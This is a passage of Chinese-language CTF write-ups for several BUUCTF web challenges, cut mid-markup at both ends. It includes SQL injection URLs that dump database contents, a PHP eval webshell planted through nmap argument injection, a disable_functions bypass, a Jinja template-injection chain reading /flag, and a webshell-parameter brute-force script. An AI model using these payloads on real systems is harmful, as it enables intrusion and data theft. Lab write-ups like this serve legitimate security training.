class=\"hljs-string\">&quot;flag:&quot;</span>,flag)<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"极客大挑战-2019buyflag\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019buyflag\">#</a> [极客大挑战 2019] BuyFlag</h2>\n<ol>\n<li>\n<p><code>view-source:http://c54f9ea8-ba26-47fa-8c09-58a7a6868706.node3.buuoj.cn/pay.php</code>  看到代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>])) &#123;<br>\t<span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>];<br>\t<span class=\"hljs-keyword\">if</span> (is_numeric(<span class=\"hljs-variable\">$password</span>)) &#123;<br>\t\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>\t&#125;<span class=\"hljs-keyword\">elseif</span> (<span class=\"hljs-variable\">$password</span> == <span class=\"hljs-number\">404</span>) &#123;<br>\t\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p><code>money=1e15&amp;password=404aaa</code>  同时修改 cookie 的 user=0 变成 user=1 即可拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"极客大挑战-2019rce-me\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019rce-me\">#</a> [极客大挑战 2019] RCE ME</h2>\n<ol>\n<li>\n<p>无数字、字母 shell，</p>\n</li>\n<li>\n<p><a href=\"https://blog.csdn.net/a15803617402/article/details/83589181\">https://blog.csdn.net/a15803617402/article/details/83589181</a></p>\n</li>\n<li>\n<p><a href=\"https://www.freebuf.com/news/186298.html\">https://www.freebuf.com/news/186298.html</a></p>\n</li>\n<li>\n<p>利用 LD_PRELOAD+without send_mail 绕过 disable_functions，调用’/readflag’拿到 flag</p>\n</li>\n<li>\n<p>放个 payload</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">?code=<span class=\"hljs-variable\">$_</span>=<span class=\"hljs-string\">&quot;`&#123;&#123;&#123;&quot;</span>^<span class=\"hljs-string\">&quot;?&lt;&gt;/&quot;</span>;<span class=\"hljs-variable\">$&#123;$_&#125;</span>[_](<span class=\"hljs-variable\">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=eval(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;flag&#x27;</span>])&amp;cmd=<span class=\"hljs-regexp\">/readflag&amp;outpath=/</span>var<span class=\"hljs-regexp\">/tmp/</span>a&amp;sopath=<span class=\"hljs-regexp\">/var/</span>tmp/disable.so<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"网鼎杯-2018fakebook\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2018fakebook\">#</a> [网鼎杯 2018] Fakebook</h2>\n<ol>\n<li>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1</code>  可能存在注入，用单引号测试发现报错。测试后发现是整型注入，尝试 <code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0^1</code>  和 <code>0^0</code>  注入成功</p>\n</li>\n<li>\n<p>虽然可以盲注，但是还是比较麻烦，既然有报错就尝试报错注入：</p>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20database())),1)</code>  拿到了数据库名 =&gt;“fakebook”</p>\n</li>\n<li>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27)),1)</code>  拿到表名 =&gt;“users”</p>\n</li>\n<li>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)),1)</code>  拿到字段名 =&gt;“no,username,passwd,data”</p>\n</li>\n<li>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20substr(data,61,30)%20from%20fakebook.users)),1)</code>  拿数据”1，m1n,3c9909afec25354d551dae21590bb2, <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;m1n&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;m1n.me&quot;;&#125;</code> “，发现一段反序列化的字符串。是我刚刚注册的信息</p>\n</li>\n<li>\n<p>不太懂有啥用，尝试扫后台，扫到 robots.txt，/user.php.bak 拿到源码</p>\n</li>\n<li>\n<p>构造 <code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0/**/union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:3:%22m1n%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27</code>  就可以读到 flag</p>\n</li>\n</ol>\n<h2 id=\"zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#zjctf-2019nizhuansiwei\">#</a> [ZJCTF 2019]NiZhuanSiWei</h2>\n<ol>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-variable\">$text</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;text&quot;</span>];<br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file&quot;</span>];<br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;password&quot;</span>];<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>).<span class=\"hljs-string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">&quot;/flag/&quot;</span>,<span class=\"hljs-variable\">$file</span>))&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Not now!&quot;</span>;<br>        <span class=\"hljs-keyword\">exit</span>(); <br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br>        <span class=\"hljs-variable\">$password</span> = unserialize(<span class=\"hljs-variable\">$password</span>);<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br>    &#125;<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>    highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>第一层主要是考察 php 伪协议： <code>text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code> , 同时 POST”welcome to the zjctf“，可以拿到 useless.php 源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;  <span class=\"hljs-comment\">//flag.php  </span><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>直接构造 payload 就可以拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"bjdctf2020easy-md5\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf2020easy-md5\">#</a> [BJDCTF2020]Easy MD5</h2>\n<ol>\n<li>\n<p>抓包，在 header 部分拿到 hint：”select * from ‘admin’ where password=md5 ($pass,true)“，之前遇到过，输入密码”ffifdyop“，跳转到  levels91.php</p>\n</li>\n<li>\n<p>源码：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-comment\">&lt;!--</span><br><span class=\"hljs-comment\">$a = $GET[&#x27;a&#x27;];</span><br><span class=\"hljs-comment\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class=\"hljs-comment\">    // wow, glzjin wants a girl friend.</span><br><span class=\"hljs-comment\">--&gt;</span><br></code></pre></td></tr></table></figure>\n<p>?a=s155964671a&amp;b=s878926199a 跳转到 levell14.php</p>\n</li>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param1&#x27;</span>]!==<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param1&#x27;</span>])===md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param2&#x27;</span>]))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure>\n<p>强类型比较，但是 php 中 MD5（数组）将会返回 NULL，因此 POST <code>param1[]=1&amp;param2[]=2</code>  即可拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"roarctf-2019easy-java\"><a class=\"markdownIt-Anchor\" href=\"#roarctf-2019easy-java\">#</a> [RoarCTF 2019]Easy Java</h2>\n<ol>\n<li>WEB-INF/web.xml 泄露，<a href=\"https://blog.csdn.net/wy_97/article/details/78165051\">https://blog.csdn.net/wy_97/article/details/78165051</a></li>\n<li>修改请求方法？filename=WEB-INF/web.xml 可以看到”/Download                 FlagController        com.wm.ctf.FlagController                FlagController        /Flag “</li>\n<li>filename=WEB-INF/classes/com/wm/ctf/FlagController.class 其中有一段 base64 编码，解码拿到 flag</li>\n</ol>\n<h2 id=\"buuctf-2018online-tool\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-2018online-tool\">#</a> [BUUCTF 2018]Online Tool</h2>\n<ol>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;REMOTE_ADDR&#x27;</span>] = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;host&#x27;</span>])) &#123;<br>    highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-variable\">$host</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;host&#x27;</span>];<br>    <span class=\"hljs-variable\">$host</span> = escapeshellarg(<span class=\"hljs-variable\">$host</span>);<br>    <span class=\"hljs-variable\">$host</span> = escapeshellcmd(<span class=\"hljs-variable\">$host</span>);<br>    <span class=\"hljs-variable\">$sandbox</span> = md5(<span class=\"hljs-string\">&quot;glzjin&quot;</span>. <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;you are in sandbox &#x27;</span>.<span class=\"hljs-variable\">$sandbox</span>;<br>    @mkdir(<span class=\"hljs-variable\">$sandbox</span>);<br>    chdir(<span class=\"hljs-variable\">$sandbox</span>);<br>    <span class=\"hljs-keyword\">echo</span> system(<span class=\"hljs-string\">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class=\"hljs-variable\">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>考点应该是 bypass  escapeshellarg 和 escapeshellcmd 以及参数注入</p>\n</li>\n<li>\n<p>nmap 的参数注入的话有一个 <code>-oG</code>  或者 <code>-oN</code>  或者 <code>-o</code>  都可以进行写文件操作，接下来就是如何绕过两个函数了</p>\n</li>\n<li>\n<p>[<a href=\"https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD\">https://mochazz.github.io/2018/07/30 / 代码审计 Day5 - escapeshellarg 与 escapeshellcmd 使用不当 /# 结语</a>](<a href=\"https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5\">https://mochazz.github.io/2018/07/30 / 代码审计 Day5</a> - escapeshellarg 与 escapeshellcmd 使用不当 /# 结语)</p>\n</li>\n<li>\n<p><a href=\"https://paper.seebug.org/164/\">https://paper.seebug.org/164/</a></p>\n</li>\n<li>\n<p>看到了这两个函数公用导致的引号逃逸</p>\n</li>\n<li>\n<p>接下来就是调试 payload 了，引号这个东西有点难调试</p>\n</li>\n<li>\n<p>最后 payload <code>?host=' &lt;?php @eval($_POST[&quot;flag&quot;]);?&gt; -oG flag.php '</code></p>\n</li>\n</ol>\n<h2 id=\"强网杯-2019高明的黑客\"><a class=\"markdownIt-Anchor\" href=\"#强网杯-2019高明的黑客\">#</a> [强网杯 2019] 高明的黑客</h2>\n<ol>\n<li>\n<p>源码中有几千个 shell，但是基本都是不能用的，也就是需要我们用脚本找出可以用的 shell</p>\n</li>\n<li>\n<p>刚开始写了个垃圾单线程脚本，跑应该是跑的出来的，就是可能要挺久</p>\n</li>\n<li>\n<p>然后尝试写了个多线程的脚本，但是一个一个遍历参数，估计也是要好久</p>\n</li>\n<li>\n<p>网上看到一个比较好的脚本，一个文件只访问一次，把所有参数一次都传过去这样就减少了大部分的请求，在确认某一个文件存在 shell 之后再遍历所有参数来找到可用参数</p>\n</li>\n<li>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> re<br><span class=\"hljs-keyword\">import</span> threading<br><span class=\"hljs-keyword\">import</span> time<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(<span class=\"hljs-number\">100</span>)  \t\t\t\t\t\t\t  \t\t\t<span class=\"hljs-comment\">#这儿设置最大的线程数</span><br>filePath = <span class=\"hljs-string\">r&quot;D:/phpstudy_pro/WWW/src&quot;</span><br>os.chdir(filePath)\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#改变当前的路径</span><br>requests.adapters.DEFAULT_RETRIES = <span class=\"hljs-number\">5</span>\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#设置重连次数，防止线程数过高，断开连接</span><br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class=\"hljs-literal\">False</span>\t\t\t\t\t\t\t\t\t\t\t <span class=\"hljs-comment\"># 设置连接活跃状态为False</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_content</span>(<span class=\"hljs-params\">file</span>):</span><br>    s1.acquire()\t\t\t\t\t\t\t\t\t\t\t\t<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;trying   &#x27;</span>+file+ <span class=\"hljs-string\">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file,encoding=<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>) <span class=\"hljs-keyword\">as</span> f:\t\t\t\t\t\t\t<span class=\"hljs-comment\">#打开php文件，提取所有的$_GET和$_POST的参数</span><br>            gets = <span class=\"hljs-built_in\">list</span>(re.findall(<span class=\"hljs-string\">&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;</span>, f.read()))<br>            posts = <span class=\"hljs-built_in\">list</span>(re.findall(<span class=\"hljs-string\">&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#所有的$_POST</span><br>    params = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#所有的$_GET</span><br>    <span class=\"hljs-keyword\">for</span> m <span class=\"hljs-keyword\">in</span> gets:<br>        params[m] = <span class=\"hljs-string\">&quot;whoami&quot;</span><br>    <span class=\"hljs-keyword\">for</span> n <span class=\"hljs-keyword\">in</span> posts:<br>        data[n] = <span class=\"hljs-string\">&quot;whoami&quot;</span><br>    url = <span class=\"hljs-string\">&#x27;http://127.0.0.1/src/&#x27;</span>+file<br>    req = session.post(url, data=data, params=params)\t\t\t<span class=\"hljs-comment\">#一次性请求所有的GET和POST</span><br>    req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># 关闭请求  释放内存</span><br>    req.encoding = <span class=\"hljs-string\">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class=\"hljs-comment\">#print(content)</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#如果发现有可以利用的参数，继续筛选出具体的参数</span><br>        flag = <span class=\"hljs-number\">0</span><br>        <span class=\"hljs-keyword\">for</span> a <span class=\"hljs-keyword\">in</span> gets:<br>            req = session.get(url+<span class=\"hljs-string\">&#x27;?%s=&#x27;</span>%a+<span class=\"hljs-string\">&quot;whoami&quot;</span>)<br>            content = req.text<br>            req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># 关闭请求  释放内存</span><br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:<br>                flag = <span class=\"hljs-number\">1</span><br>                <span class=\"hljs-keyword\">break</span><br>        <span class=\"hljs-keyword\">if</span> flag != <span class=\"hljs-number\">1</span>:<br>            <span class=\"hljs-keyword\">for</span> b <span class=\"hljs-keyword\">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class=\"hljs-string\">&quot;whoami&quot;</span>&#125;)<br>                content = req.text<br>                req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># 关闭请求  释放内存</span><br>                <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:<br>                    <span class=\"hljs-keyword\">break</span><br>        <span class=\"hljs-keyword\">if</span> flag == <span class=\"hljs-number\">1</span>:\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br>            param = a<br>        <span class=\"hljs-keyword\">else</span>:<br>            param = b<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;找到了利用文件： &#x27;</span>+file+<span class=\"hljs-string\">&quot;  and 找到了利用的参数：%s&quot;</span> %param)<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> files:\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#加入多线程</span><br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()<br><br></code></pre></td></tr></table></figure>\n<p>果然还是菜的惨不忍睹</p>\n</li>\n</ol>\n<h2 id=\"bjdctf-2ndfake-google\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf-2ndfake-google\">#</a> [BJDCTF 2nd]fake google</h2>\n<ol>\n<li>测试 <code>&lt;script&gt;alert(111)&lt;/script&gt;</code>  可以执行</li>\n<li>查看网页源代码提示 ssti</li>\n<li>?name=3测试的确存在 ssti</li>\n<li>最终 payload： <code>?name=&#123;&#123;True.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125;</code>  直接拿到 flag</li>\n</ol>\n<h2 id=\"de1ctf-2019ssrf-me\"><a class=\"markdownIt-Anchor\" href=\"#de1ctf-2019ssrf-me\">#</a> [De1CTF 2019]SSRF Me</h2>\n<ol>\n<li>\n<p>访问拿到源码，源码审计</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span 